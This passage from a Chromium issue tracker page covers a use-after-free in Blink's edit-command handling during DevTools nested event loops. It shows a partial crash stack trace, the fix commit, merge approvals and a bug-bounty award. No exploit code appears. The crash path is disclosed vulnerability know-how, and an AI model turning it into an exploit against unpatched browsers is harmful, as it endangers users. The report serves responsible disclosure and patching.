    #7 0x56323e8d39ea in blink::WebFrameWidgetImpl::SetEditCommandsForNextKeyEvent(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>) ./../../third_party/blink/renderer/core/frame/web_frame_widget_impl.cc:3585:3
    #8 0x5632421ee45e in blink::WidgetBase::SetEditCommandsForNextKeyEvent(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>) ./../../third_party/blink/renderer/platform/widget/widget_base.cc:1308:17
    #9 0x5632421c48c1 in void base::internal::FunctorTraits<void (blink::WidgetBase::*)(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>), void>::Invoke<void (blink::WidgetBase::*)(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>), base::WeakPtr<blink::WidgetBase>, WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>>(void (blink::WidgetBase::*)(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>), base::WeakPtr<blink::WidgetBase>&&, WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>&&) ./../../base/functional/bind_internal.h:744:12
    #10 0x5632421c463a in MakeItSo<void (blink::WidgetBase::*)(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0U, WTF::PartitionAllocator>), std::Cr::tuple<base::WeakPtr<blink::WidgetBase>, WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0U, WTF::PartitionAllocator> > > ./../../base/functional/bind_internal.h:946:5
    #11 0x5632421c463a in RunImpl<void (blink::WidgetBase::*)(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0U, WTF::PartitionAllocator>), std::Cr::tuple<base::WeakPtr<blink::WidgetBase>, WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0U, WTF::PartitionAllocator> >, 0UL, 1UL> ./../../base/functional/bind_internal.h:1018:12
    #12 0x5632421c463a in base::internal::Invoker<base::internal::BindState<void (blink::WidgetBase::*)(WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>), base::WeakPtr<blink::WidgetBase>, WTF::Vector<mojo::InlinedStructPtr<blink::mojom::blink::EditCommand>, 0u, WTF::PartitionAllocator>>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:969:12
    #13 0x5632421c2b09 in Run ./../../base/functional/callback.h:152:12
    #14 0x5632421c2b09 in blink::(anonymous namespace)::RunClosureIfNotSwappedOut(base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>) ./../../third_party/blink/renderer/platform/widget/input/widget_input_handler_impl.cc:34:22
    #15 0x5632421c97ec in Invoke<void (*)(base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>), base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()> > ./../../base/functional/bind_internal.h:634:12
    #16 0x5632421c97ec in MakeItSo<void (*)(base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>), std::Cr::tuple<base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()> > > ./../../base/functional/bind_internal.h:923:12
    #17 0x5632421c97ec in RunImpl<void (*)(base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>), std::Cr::tuple<base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()> >, 0UL, 1UL> ./../../base/functional/bind_internal.h:1018:12
    #18 0x5632421c97ec in base::internal::Invoker<base::internal::BindState<void (*)(base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>), base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:969:12
    #19 0x56324214554e in Run ./../../base/functional/callback.h:152:12
    #20 0x56324214554e in blink::(anonymous namespace)::QueuedClosure::Dispatch(blink::MainThreadEventQueue*) ./../../third_party/blink/renderer/platform/widget/input/main_thread_event_queue.cc:40:71
    #21 0x56324213d76b in blink::MainThreadEventQueue::DispatchEvents() ./../../third_party/blink/renderer/platform/widget/input/main_thread_event_queue.cc:512:11
    #22 0x5632421460d1 in Invoke<void (blink::MainThreadEventQueue::*)(), scoped_refptr<blink::MainThreadEventQueue> > ./../../base/functional/bind_internal.h:744:12
    #23 0x5632421460d1 in MakeItSo<void (blink::MainThreadEventQueue::*)(), std::Cr::tuple<scoped_refptr<blink::MainThreadEventQueue> > > ./../../base/functional/bind_internal.h:923:12
    #24 0x5632421460d1 in RunImpl<void (blink::MainThreadEventQueue::*)(), std::Cr::tuple<scoped_refptr<blink::MainThreadEventQueue> >, 0UL> ./../../base/functional/bind_internal.h:1018:12
    #25 0x5632421460d1 in base::internal::Invoker<base::internal::BindState<void (blink::MainThreadEventQueue::*)(), scoped_refptr<blink::MainThreadEventQueue>>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:969:12
    #26 0x563230515699 in Run ./../../base/functional/callback.h:152:12
    #27 0x563230515699 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:178:34
    #28 0x5632305a25b1 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:478:11)> ./../../base/task/common/task_annotator.h:89:5
    #29 0x5632305a25b1 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:476:23
    #30 0x5632305a06cb in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:341:41
    #31 0x5632305a4395 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #32 0x5632303d58e4 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:48:55
    #33 0x5632305a5818 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:638:12
    #34 0x56323048b9ed in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #35 0x56323cd182df in content::(anonymous namespace)::NestedMessageLoopRunnerImpl::Run() ./../../content/child/blink_platform_impl.cc:88:14
    #36 0x56324301c28b in blink::ClientMessageLoopAdapter::RunLoop(blink::WebLocalFrameImpl*) ./../../third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc:225:20
    #37 0x56324301dbd3 in blink::ClientMessageLoopAdapter::RunForPageWait(blink::WebLocalFrameImpl*) ./../../third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc:164:7
    #38 0x563243018e5b in PauseForPageWait ./../../third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc:130:18
    #39 0x563243018e5b in WaitForDebugger ./../../third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc:496:3
    #40 0x563243018e5b in blink::WebDevToolsAgentImpl::DidShowNewWindow() ./../../third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc:488:3
    #41 0x5632431382a6 in blink::WebViewImpl::Show(base::TokenType<blink::LocalFrameTokenTypeMarker> const&, blink::NavigationPolicy, gfx::Rect const&, gfx::Rect const&, bool) ./../../third_party/blink/renderer/core/exported/web_view_impl.cc:3044:33
    #42 0x5632408e0071 in blink::ChromeClientImpl::Show(blink::LocalFrame&, blink::LocalFrame&, blink::NavigationPolicy, bool) ./../../third_party/blink/renderer/core/page/chrome_client_impl.cc:370:14
    #43 0x563240944b70 in blink::CreateNewWindow(blink::LocalFrame&, blink::FrameLoadRequest&, WTF::AtomicString const&) ./../../third_party/blink/renderer/core/page/create_window.cc:375:27
    #44 0x563240985bae in blink::FrameTree::FindOrCreateFrameForNavigation(blink::FrameLoadRequest&, WTF::AtomicString const&) const ./../../third_party/blink/renderer/core/page/frame_tree.cc:246:13
    #45 0x5632406b1d7d in blink::FormSubmission::Create(blink::HTMLFormElement*, blink::FormSubmission::Attributes const&, blink::Event const*, blink::HTMLFormControlElement*) ./../../third_party/blink/renderer/core/loader/form_submission.cc:354:12
    #46 0x56323eb747cf in blink::HTMLFormElement::ScheduleFormSubmission(blink::Event const*, blink::HTMLFormControlElement*) ./../../third_party/blink/renderer/core/html/forms/html_form_element.cc:472:7
    #47 0x563221c4f401 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./../../v8/src/api/api-arguments-inl.h:146:3
    #48 0x563221c4b7d3 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, unsigned long*, int) ./../../v8/src/builtins/builtins-api.cc:113:36
    #49 0x563221c47c6d in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:144:5
    #50 0x563221c46772 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:135:1
    #51 0x56322603bbb6 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc:0:0


### gi...@appspot.gserviceaccount.com (2023-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/d9b34f0f3a2d0dd73648eca3ef940fb66806227b

commit d9b34f0f3a2d0dd73648eca3ef940fb66806227b
Author: Dave Tapuska <dtapuska@chromium.org>
Date: Tue Mar 21 19:34:10 2023

Move the edit commands to an on stack variable

DevTools uses nested event loops and the usage of the class member can
be problematic for iteration because the nested loop can change the
variable's storage causing a UAF.

Bug: 1420510
Change-Id: Ie08a71b60401fa4322cca0cc31062ba64672126a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4355811
Reviewed-by: David Bokan <bokan@chromium.org>
Commit-Queue: Dave Tapuska <dtapuska@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1120123}

[modify] https://crrev.com/d9b34f0f3a2d0dd73648eca3ef940fb66806227b/third_party/blink/renderer/core/frame/web_frame_widget_impl.cc


### dt...@chromium.org (2023-03-21)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-03-21)

Thanks for landing this fix, dtapuska@! (And thank you Thomas for updating with a POC, new details and repro info!)

This appears to have been introduced before 110, so updating to FoundIn-110 since 110 is current Extended Stable (so SI-Stable).
This will allow the bot to request appropriate merges which can be performed after appropriate bake time.

### [Deleted User] (2023-03-22)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-22)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-22)

Requesting merge to extended stable M110 because latest trunk commit (1120123) appears to be after extended stable branch point (1084008).

Requesting merge to stable M111 because latest trunk commit (1120123) appears to be after stable branch point (1097615).

Requesting merge to beta M112 because latest trunk commit (1120123) appears to be after beta branch point (1109224).

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-22)

Merge review required: M112 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-22)

Merge review required: M111 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-22)

Merge review required: M110 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), ceb (ChromeOS), danielyip (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-03-24)

M112 merge approved, please merge this fix to branch 5615 by EOD Monday, 27 March so that this fix can be included in M112/Stable RC. 

There are no further planned releases of M111/Stable and M110/Extended, so just removing those merge requests. 

### gi...@appspot.gserviceaccount.com (2023-03-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/d6946b70b4318a8793f9356eed146a8e722ea5ce

commit d6946b70b4318a8793f9356eed146a8e722ea5ce
Author: Dave Tapuska <dtapuska@chromium.org>
Date: Fri Mar 24 19:32:54 2023

[M112] Move the edit commands to an on stack variable

DevTools uses nested event loops and the usage of the class member can
be problematic for iteration because the nested loop can change the
variable's storage causing a UAF.

(cherry picked from commit d9b34f0f3a2d0dd73648eca3ef940fb66806227b)

Bug: 1420510
Change-Id: Ie08a71b60401fa4322cca0cc31062ba64672126a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4355811
Reviewed-by: David Bokan <bokan@chromium.org>
Commit-Queue: Dave Tapuska <dtapuska@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1120123}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4369603
Cr-Commit-Position: refs/branch-heads/5615@{#809}
Cr-Branched-From: 9c6408ef696e83a9936b82bbead3d41c93c82ee4-refs/heads/main@{#1109224}

[modify] https://crrev.com/d6946b70b4318a8793f9356eed146a8e722ea5ce/third_party/blink/renderer/core/frame/web_frame_widget_impl.cc


### [Deleted User] (2023-03-24)

LTS Milestone M108

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2023-03-27)

[Empty comment from Monorail migration]

### rz...@google.com (2023-03-27)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-27)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2023-03-27)

1. Just https://crrev.com/c/4372837
2. Low, no conflicts
3. 112
4. Yes

### gm...@google.com (2023-03-28)

[Empty comment from Monorail migration]

### am...@google.com (2023-03-29)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-03-29)

Congratulations, Thomas! The VRP Panel has decided to award you $3,000 for this report of a mildly mitigated security bug in the renderer process. Thank you for your efforts and reporting this issue to us! 

### am...@chromium.org (2023-03-31)

[Empty comment from Monorail migration]

### am...@google.com (2023-04-01)

[Empty comment from Monorail migration]

### pg...@google.com (2023-04-04)

[Empty comment from Monorail migration]

### pg...@google.com (2023-04-04)

[Empty comment from Monorail migration]

### gm...@google.com (2023-04-13)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-04-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/c46c6e901ab5a37cab97aae0d9cc20ffeea85392

commit c46c6e901ab5a37cab97aae0d9cc20ffeea85392
Author: Dave Tapuska <dtapuska@chromium.org>
Date: Thu Apr 13 15:10:13 2023

[M108-LTS] Move the edit commands to an on stack variable

DevTools uses nested event loops and the usage of the class member can
be problematic for iteration because the nested loop can change the
variable's storage causing a UAF.

(cherry picked from commit d9b34f0f3a2d0dd73648eca3ef940fb66806227b)

Bug: 1420510
Change-Id: Ie08a71b60401fa4322cca0cc31062ba64672126a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4355811
Commit-Queue: Dave Tapuska <dtapuska@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1120123}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4372837
Reviewed-by: Dave Tapuska <dtapuska@chromium.org>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Cr-Commit-Position: refs/branch-heads/5359@{#1435}
Cr-Branched-From: 27d3765d341b09369006d030f83f582a29eb57ae-refs/heads/main@{#1058933}

[modify] https://crrev.com/c46c6e901ab5a37cab97aae0d9cc20ffeea85392/third_party/blink/renderer/core/frame/web_frame_widget_impl.cc


### rz...@google.com (2023-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2023-06-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1420510?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063314)*
